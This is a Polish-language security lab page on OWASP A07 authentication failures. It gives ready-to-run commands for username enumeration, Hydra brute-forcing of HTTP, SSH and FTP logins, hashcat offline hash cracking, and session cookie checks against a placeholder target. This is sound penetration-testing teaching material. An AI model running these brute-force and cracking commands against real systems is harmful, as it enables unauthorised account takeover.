---
title: A07 — Authentication Failures
sidebar_position: 7
tags: [lab, owasp-a07, brute-force, enumeration, session]
---

# A07 — Authentication Failures

## Zakres laboratorium

- Enumeracja nazw użytkowników — wykrywanie różnic w odpowiedziach dla prawidłowych i nieprawidłowych nazw użytkowników
- Ataki brute force — Hydra przez HTTP, SSH, FTP
- Łamanie skrótów offline — tryby hashcat i strategie ataków
- Analiza tokenów sesji — sprawdzanie flag bezpieczeństwa ciasteczek i entropii tokenów

## Konfiguracja

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
WORDLIST="/usr/share/wordlists/rockyou.txt"
```

## Ćwiczenie 1: Enumeracja nazw użytkowników

Porównaj rozmiar odpowiedzi i czas dla istniejących i nieistniejących użytkowników:

```bash
USERNAMES=(admin administrator root user test guest support info contact nobody)

for USERNAME in "${USERNAMES[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}:%{time_total}" \
    -X POST "$TARGET/login" \
    -d "username=$USERNAME&password=invalidpassword12345")
  echo "$USERNAME: $RESPONSE"
done
```

Podatna aplikacja zwraca różne kody statusu HTTP, rozmiary treści odpowiedzi lub czasy odpowiedzi dla prawidłowych i nieprawidłowych nazw użytkowników — pozwalając atakującemu potwierdzić, które nazwy użytkowników istnieją, przed przystąpieniem do brute-forcingu haseł.

## Ćwiczenie 2: Brute force z Hydra

### Formularz logowania HTTP POST

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P "$WORDLIST" \
      -t 4 \
      "$TARGET" http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### Uwierzytelnianie HTTP Basic

```bash
hydra -l admin -P "$WORDLIST" "$TARGET" http-get /protected/
```

### SSH

```bash
hydra -l root -P "$WORDLIST" ssh://$TARGET
```

### FTP

```bash
hydra -l admin -P "$WORDLIST" ftp://$TARGET
```

### Sprawdzenie rate limiting

```bash
for i in $(seq 1 20); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET/login" \
    -d "username=admin&password=wrongpassword$i")
  echo "Attempt $i: HTTP $RESPONSE"
  if [ "$RESPONSE" = "429" ]; then
    echo "[RATE LIMITED] Server returned 429 after $i attempts"
    break
  fi
done
```

HTTP 429 (Too Many Requests) wskazuje, że rate limiting jest zaimplementowany. Brak 429 po 20 próbach stanowi podatność.

## Ćwiczenie 3: Łamanie skrótów offline

### Identyfikacja typu skrótu

```bash
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
hashid "5f4dcc3b5aa765d61d8327deb882cf99"
```

### Tryby hashcat

| Tryb | Algorytm |
|------|---------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 1800 | sha512crypt (Linux shadow) |
| 500 | md5crypt (Apache, starszy Linux) |

### Atak słownikowy

```bash
hashcat -m 0 hashes.txt "$WORDLIST"
```

### Atak oparty na regułach (mangling)

```bash
hashcat -m 0 hashes.txt "$WORDLIST" -r /usr/share/hashcat/rules/best64.rule
```

### Atak maskowy — oparty na wzorcu

```bash
# Hasła 8-znakowe: wielka litera + małe litery + cyfry
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d
```

## Ćwiczenie 4: Analiza tokenów sesji

### Ekstrakcja nagłówków Set-Cookie

```bash
curl -sI -X POST "$TARGET/login" \
  -d "username=admin&password=password" \
  | grep -i "set-cookie"
```

### Sprawdzenie flag bezpieczeństwa

Dla każdego ciasteczka zweryfikuj:

| Flaga | Przeznaczenie | Podatność przy braku |
|-------|--------------|---------------------|
| `HttpOnly` | Zapobiega dostępowi JavaScript | XSS może ukraść ciasteczko |
| `Secure` | Ciasteczko wysyłane tylko przez HTTPS | Ciasteczko wysyłane przez zwykłe HTTP |
| `SameSite=Strict` lub `Lax` | Ochrona przed CSRF | Ryzyko fiksacji sesji/CSRF |

### Sprawdzenie długości tokenu

```bash
SESSION_TOKEN=$(curl -sI -X POST "$TARGET/login" \
  -d "username=admin&password=password" \
  | grep -i "set-cookie" \
  | grep -oP "session=\K[^;]+")

TOKEN_LENGTH=${#SESSION_TOKEN}
echo "Token: $SESSION_TOKEN"
echo "Length: $TOKEN_LENGTH characters"

if [ "$TOKEN_LENGTH" -lt 16 ]; then
  echo "[WEAK] Token is shorter than 16 characters — may be predictable"
else
  echo "[OK] Token length is $TOKEN_LENGTH characters"
fi
```

Token sesji krótszy niż 16 znaków (lub taki, który podąża za przewidywalnym wzorcem) stanowi podatność. Tokeny powinny być kryptograficznie losowe i mieć co najmniej 128 bitów (16 bajtów, 32 znaki hex).
